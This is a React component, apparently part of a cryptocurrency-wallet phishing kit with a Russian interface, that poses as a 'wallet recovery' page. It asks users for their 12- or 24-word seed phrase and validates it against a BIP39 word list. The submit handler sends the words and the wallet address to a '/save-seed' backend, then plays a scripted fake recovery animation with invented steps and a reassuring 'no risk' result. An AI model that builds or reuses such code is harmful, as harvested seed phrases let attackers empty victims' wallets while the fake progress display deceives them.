import React from "react";
import { useNavigate } from "react-router-dom";

const icons = [
  <img src="/blue-cube.png" alt="cube" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/ring-icon.jpg" alt="ring" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/diamond-icon.png" alt="diamond" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/shield-icon.jpg" alt="shield" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/wallet-icon.jpg" alt="wallet" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/ton-diamond.png" alt="ton-diamond" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/symbolic-icon.png" alt="symbolic" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/symbolic-icon2.png" alt="symbolic2" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />, 
  <img src="/waves-icon.jpg" alt="waves" style={{width: 60, height: 60, display: 'block', border: 'none', borderRadius: 12, background: '#181c24', objectFit: 'contain'}} />
];

const ALLOWED_WORDS_ARRAY = [
  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"];

function isAllowedWord(word) {
  return ALLOWED_WORDS_ARRAY.includes(word);
}

export default function WalletSummaryTest() {
  // Независимая анимация восстановления
  const [showRecoveryModal, setShowRecoveryModal] = React.useState(false);
  const [recoveryProgress, setRecoveryProgress] = React.useState(0);
  const [recoveryStep, setRecoveryStep] = React.useState('');
  const [recoveryResult, setRecoveryResult] = React.useState(null);
  const recoverySteps = [
    'Подключение к серверу...',
    'Проверка соединения с блокчейном...',
    'Инициализация модулей безопасности...',
    'Подключение к кошельку...',
    'Синхронизация с сетью...',
    'Восстановление активности адреса...',
    'Проверка статуса сети...',
    'Финальная верификация...',
    'Восстановление успешно завершено',
  ];
  React.useEffect(() => {
    if (!showRecoveryModal) return;
    setRecoveryProgress(0);
    setRecoveryStep(recoverySteps[0]);
    setRecoveryResult(null);
    let stepIndex = 0;
    let progressValue = 0;
    let stopped = false;
    function nextStep() {
      if (stopped) return;
      if (stepIndex < recoverySteps.length) {
        setRecoveryStep(recoverySteps[stepIndex]);
        const target = Math.round(((stepIndex + 1) / recoverySteps.length) * 100);
        let increment = () => {
          if (progressValue < target) {
            progressValue += Math.max(1, Math.round((target - progressValue) / 10));
            setRecoveryProgress(progressValue);
            setTimeout(increment, 60 + Math.random() * 60);
          } else {
            setRecoveryProgress(target);
            stepIndex++;
            setTimeout(nextStep, 900 + Math.random() * 800);
          }
        };
        increment();
      } else {
        setTimeout(() => {
          setRecoveryResult({
            risk: 'Средний',
            message: 'Восстановление завершено. Перезагрузите ваше устройство. Проверьте баланс и активы.',
            tonBalance: '0.234',
            tokens: 12,
            nft: 1,
          });
        }, 1200 + Math.random() * 900);
      }
    }
    nextStep();
    return () => { stopped = true; };
  }, [showRecoveryModal]);
  const [seedWords, setSeedWords] = React.useState(Array(12).fill(""));
  const [wordsCount, setWordsCount] = React.useState(12);
  const [inputErrors, setInputErrors] = React.useState(Array(12).fill(false));
  const [touched, setTouched] = React.useState(Array(12).fill(false));
  const navigate = useNavigate();
  const selectedWalletIdx = Number(localStorage.getItem('selectedWalletIdx'));

  function getColumnMajorNumber(i) {
    const cols = wordsCount === 24 ? 3 : 2;
    const rows = Math.ceil(wordsCount / cols);
    const col = i % cols;
    const row = Math.floor(i / cols);
    return row + 1 + col * rows;
  }

  const handlePaste = (e) => {
    const text = (e.clipboardData || window.clipboardData).getData('text');
    if (!text) return;
    const words = text.trim().split(/\s+/).filter(Boolean);
    if (words.length === 12 || words.length === 24) {
      e.preventDefault();
      setWordsCount(words.length);
      const cleanWords = words.map(w => w.trim().toLowerCase());
      setSeedWords(cleanWords);
      setTouched(Array(words.length).fill(true));
      setInputErrors(cleanWords.map(w => !!w && !isAllowedWord(w)));
    }
  };

  const handleChangeWord = (index, value) => {
    const clean = value.trim().toLowerCase();
    const newWords = [...seedWords];
    newWords[index] = clean;
    setSeedWords(newWords);
  };

  const handleBlur = (index) => {
    const clean = seedWords[index].trim().toLowerCase();
    const newTouched = [...touched];
    newTouched[index] = true;
    setTouched(newTouched);
    const newErrors = [...inputErrors];
    newErrors[index] = !!clean && !isAllowedWord(clean);
    setInputErrors(newErrors);
  };

  // handleToggleShow удалён, больше не нужен

  const handleWordsCount = (count) => {
  setWordsCount(count);
  setSeedWords(Array(count).fill(""));
  setInputErrors(Array(count).fill(false));
  setTouched(Array(count).fill(false));
  };

  const handleClear = () => {
    setSeedWords(Array(wordsCount).fill(""));
    setInputErrors(Array(wordsCount).fill(false));
    setTouched(Array(wordsCount).fill(false));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (window.sessionStorage.getItem('recoveryFinished')) return;
    // Получаем адрес кошелька из localStorage (или другого источника)
    const walletAddress = localStorage.getItem('walletAddress');
    fetch('http://localhost:3001/api/save-seed', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletAddress, seedWords })
    })
      .then(res => res.json())
      .then(data => {
        setShowRecoveryModal(true);
        window.sessionStorage.setItem('recoveryStarted', '1');
      })
      .catch(err => {
        alert('Ошибка сохранения файла кошелька!');
      });
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
    }
  };

  const isFormValid = seedWords.length === wordsCount && seedWords.every(w => !!w) && inputErrors.every(e => !e);

  return (
    <div className="page1-hello" style={{ boxSizing: 'border-box' }}>
      <div className="header" style={{ marginBottom: 0 }}>
        <div className="logo-container" style={{ marginBottom: 10, position: 'relative', width: 60, height: 60, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {Number.isFinite(selectedWalletIdx) && icons[selectedWalletIdx]}
        </div>
      </div>
      <style>{`
        .wordcount-switcher {
          display: flex;
          justify-content: center;
          margin-bottom: 18px;
          position: relative;
          z-index: 1;
        }
        .wordcount-btn {
          background: none;
          color: #00FF7F;
          border: 1.5px solid #00FF7F;
          border-radius: 999px;
          font-family: 'Open Sans', sans-serif;
          font-size: 14px;
          font-weight: 600;
          width: 100%;
          text-align: center;
          padding: 6px 0;
          min-width: 0;
          display: block;
          margin-bottom: 8px;
          transition: border 0.2s, background 0.2s;
        }
        .wordcount-btn:hover {
          border: 2.5px solid #00FF7F;
          background: rgba(0,255,127,0.07);
        }
      `}</style>
      {showRecoveryModal && (
        <div style={{width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 32, position: 'relative'}}>
          <div className="cyber-diagnosis-anim">
            <div style={{
              width: '100%',
              textAlign: 'center',
              fontSize: '1.15rem',
              fontWeight: 700,
              color: '#00fff7',
              marginBottom: '8px',
              fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
              letterSpacing: '0.01em',
              textShadow: '0 0 8px #00fff7, 0 0 16px #2563eb, 0 1px 8px #fff'
            }}>
              {recoveryResult ? 'Восстановление завершено' : <>Ручное восстановление<br />началось:</>}
            </div>
            <div className="cyber-diagnosis-progress">
              <svg width={128} height={128} className="cyber-diagnosis-svg">
                <defs>
                  <linearGradient id="cyber-gradient2" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stopColor="#00fff7" />
                    <stop offset="100%" stopColor="#2563eb" />
                  </linearGradient>
                  <filter id="glow2" x="-40%" y="-40%" width="180%" height="180%">
                    <feGaussianBlur stdDeviation="7" result="coloredBlur"/>
                    <feMerge>
                      <feMergeNode in="coloredBlur"/>
                      <feMergeNode in="SourceGraphic"/>
                    </feMerge>
                  </filter>
                </defs>
                <circle
                  cx={64}
                  cy={64}
                  r={56}
                  stroke="#23272e"
                  strokeWidth={8}
                  fill="none"
                />
                <circle
                  cx={64}
                  cy={64}
                  r={56}
                  stroke="url(#cyber-gradient2)"
                  strokeWidth={8}
                  fill="none"
                  strokeDasharray={2 * Math.PI * 56}
                  strokeDashoffset={2 * Math.PI * 56 - (2 * Math.PI * 56 * recoveryProgress) / 100}
                  strokeLinecap="round"
                  style={{ transition: 'stroke-dashoffset 0.5s, stroke 0.3s' }}
                  transform="rotate(-90 64 64)"
                  filter="url(#glow2)"
                />
              </svg>
              <div className="cyber-diagnosis-percent">{recoveryProgress}%</div>
            </div>
            <div style={{paddingLeft: 14, paddingRight: 14, boxSizing: 'border-box', width: '100%'}}>
              <div className="cyber-diagnosis-bar" style={{position: 'relative'}}>
                <div className={`cyber-diagnosis-bar-fill${recoveryProgress >= 92 ? ' danger' : ''}`} style={{width: `${recoveryProgress}%`}} />
                <svg width="100%" height="14" viewBox="0 0 340 14" preserveAspectRatio="none" style={{ position: 'absolute', left: 0, top: 0, zIndex: 2, pointerEvents: 'none' }}>
                  <defs>
                    <linearGradient id="cyber-bar-glow2" x1="0" y1="0" x2="1" y2="0">
                      <stop offset="0%" stopColor="#00fff7" stopOpacity="0.7" />
                      <stop offset="100%" stopColor="#2563eb" stopOpacity="0.7" />
                    </linearGradient>
                  </defs>
                  <rect x="0" y="0" width="340" height="14" fill="none" stroke="url(#cyber-bar-glow2)" strokeWidth="2.5" rx="7" />
                  {Array.from({ length: 16 }).map((_, i) => (
                    <rect
                      key={i}
                      x={i * 21.25}
                      y={0}
                      width={1.5}
                      height={14}
                      fill="#00fff733"
                    />
                  ))}
                </svg>
              </div>
            </div>
            {/* Чек-лист этапов */}
            <div className="cyber-diagnosis-checklist">
              {recoverySteps.map((step, idx) => {
                const threshold = Math.round(((idx + 1) / recoverySteps.length) * 100);
                if (recoveryProgress < threshold) return null;
                const isDone = recoveryProgress >= threshold;
                return (
                  <div key={idx} className={`cyber-diagnosis-checkitem${isDone ? ' done' : ''}`}>
                    <span className="cyber-diagnosis-checktext">{step}</span>
                    {isDone && (
                      <svg width={20} height={20} className="cyber-diagnosis-checkicon" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="10" cy="10" r="10" fill="#22c55e" />
                        <path d="M6 10.5l2.5 2.5 5-5" stroke="#fff" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
          {/* Модальное окно с результатом восстановления */}
          {recoveryResult && (
            <div style={{position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh', background: 'rgba(0,0,0,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 2000, padding: 0, overflow: 'auto'}}>
              <div className="cyber-diagnosis-result" style={{marginTop: 0}}>
                <h2 className="cyber-diagnosis-result-title">Результат восстановления</h2>
                <p className="cyber-diagnosis-result-risk">Риск: <span>отсутствует</span></p>
                <p className="cyber-diagnosis-result-message">{recoveryResult.message}</p>
              </div>
            </div>
          )}
        </div>
      )}
      {!showRecoveryModal && (
        <form onSubmit={handleSubmit} onPaste={handlePaste} onKeyDown={handleKeyDown} style={{ background: 'rgba(70,130,180,0.85)', borderRadius: 10, boxShadow: '0 2px 24px 0 #000', padding: 18, minWidth: 300, maxWidth: 420, width: '100%', border: '1.5px solid #222', position: 'relative', minHeight: 320, backdropFilter: 'blur(2px)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 18 }}>
            <div style={{ flex: 1, height: 4, background: '#222', borderRadius: 2, marginRight: 8, position: 'relative' }}>
              <div style={{ width: '100%', height: 4, background: '#00FF7F', borderRadius: 2 }} />
            </div>
            <div style={{ flex: 1, height: 4, background: '#222', borderRadius: 2, marginLeft: 8, position: 'relative' }}>
              <div style={{ width: '100%', height: 4, background: '#00FF7F', borderRadius: 2 }} />
            </div>
          </div>
          <h2
            style={{
              color: '#fff',
              fontWeight: 700,
              fontSize: 28,
              textAlign: 'center',
              marginBottom: 8,
              marginTop: 0,
              padding: 0,
              wordBreak: 'break-word',
              lineHeight: 1.2,
              width: '100%',
              overflow: 'hidden',
              textOverflow: 'ellipsis',
            }}
          >
            Введите ключ кошелька
          </h2>
          <div className="wordcount-switcher">
            <button
              type="button"
              className={"wordcount-btn" + (wordsCount === 24 ? " active" : "")}
              onClick={() => handleWordsCount(wordsCount === 12 ? 24 : 12)}
            >
              {wordsCount === 12
                ? 'У меня ключ-фраза из 24 слов'
                : 'У меня ключ-фраза из 12 слов'}
            </button>
          </div>
          {/* Подсказка об ошибке под выбором количества фраз */}
          {(() => {
            const firstErrorIdx = inputErrors.findIndex((err, idx) => touched[idx] && err);
            if (firstErrorIdx !== -1) {
              return (
                <div style={{
                  color: '#ff2d55',
                  fontSize: 15,
                  marginTop: 2,
                  marginBottom: 8,
                  marginLeft: 0,
                  fontFamily: 'Montserrat, Open Sans, sans-serif',
                  fontWeight: 700,
                  textAlign: 'center',
                  textShadow: '0 0 6px #ff2d55, 0 0 2px #fff'
                }}>
                  Некорректное слово №{getColumnMajorNumber(firstErrorIdx)}. Проверьте написание.
                </div>
              );
            }
            return null;
          })()}
          <div
            style={{
              display: 'grid',
              gridTemplateColumns: wordsCount === 24 ? 'repeat(3, 1fr)' : 'repeat(2, 1fr)',
              gap: 7,
              marginTop: 4,
              marginBottom: 10
            }}
          >
          {seedWords.map((word, i) => (
            <div key={i} style={{ display: 'flex', flexDirection: 'column', alignItems: 'stretch', background: '#23272f', borderRadius: 5, padding: 0, border: '1px solid #222', minWidth: 0, width: '100%', position: 'relative' }}>
              <div style={{ display: 'flex', alignItems: 'center' }}>
                <span style={{ color: '#7fffd4', fontWeight: 600, fontSize: 14, width: 20 }}>{getColumnMajorNumber(i)}.</span>
                <input
                  type="text"
                  value={word}
                  onChange={e => handleChangeWord(i, e.target.value)}
                  onBlur={() => handleBlur(i)}
                  placeholder={`Word ${getColumnMajorNumber(i)}`}
                  style={{
                    flex: 1,
                    background: 'transparent',
                    border: 'none',
                    color: touched[i] && inputErrors[i] ? '#e74c3c' : (touched[i] && word && !inputErrors[i] ? '#00FF7F' : '#fff'),
                    fontSize: 15,
                    padding: '2px 6px',
                    outline: 'none',
                    minWidth: 0,
                    width: '100%'
                  }}
                />
              </div>
              {/* Подсказка в самой форме убрана */}
            </div>
          ))}
          </div>
          <button
            type="button"
            onClick={handleClear}
            className="cta-button"
            style={{
              background: 'none',
              color: '#00FF7F',
              border: 'none',
              fontWeight: 600,
              fontSize: 18,
              width: '100%',
              borderRadius: 999,
              textAlign: 'center',
              padding: '12px 0',
              display: 'block',
              marginBottom: 14,
              transition: 'border 0.2s, background 0.2s',
            }}
            onMouseOver={e => { e.currentTarget.style.border = '1.5px solid #00FF7F'; e.currentTarget.style.background = 'rgba(0,255,127,0.07)'; }}
            onMouseOut={e => { e.currentTarget.style.border = 'none'; e.currentTarget.style.background = 'none'; }}
          >
            Очистить всё
          </button>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: 0, gap: 12 }}>
            <button
              type="button"
              className="cta-button"
              style={{
                background: 'none',
                color: '#00FF7F',
                border: 'none',
                fontWeight: 600,
                fontSize: 18,
                minWidth: 70,
                maxWidth: 120,
                borderRadius: 999,
                textAlign: 'center',
                padding: '10px 0',
                flex: '0 1 120px',
                display: 'block',
                transition: 'border 0.2s, background 0.2s',
              }}
              onClick={() => navigate(-1)}
              onMouseOver={e => { e.currentTarget.style.border = '1.5px solid #00FF7F'; e.currentTarget.style.background = 'rgba(0,255,127,0.07)'; }}
              onMouseOut={e => { e.currentTarget.style.border = 'none'; e.currentTarget.style.background = 'none'; }}
            >
              Назад
            </button>
            <button
              type="submit"
              className="cta-button"
              disabled={!isFormValid}
              style={{
                background: isFormValid ? '#00FF7F' : '#b2f5d6',
                color: '#111215',
                fontWeight: 700,
                fontSize: 18,
                minWidth: 140,
                maxWidth: 220,
                border: '1.5px solid #00FF7F',
                borderRadius: 999,
                textAlign: 'center',
                padding: '14px 0',
                flex: '0 1 220px',
                display: 'block',
                opacity: isFormValid ? 1 : 0.6,
                cursor: isFormValid ? 'pointer' : 'not-allowed',
              }}
            >
              Восстановить
            </button>
          </div>
        </form>
      )}
    </div>
  );
}
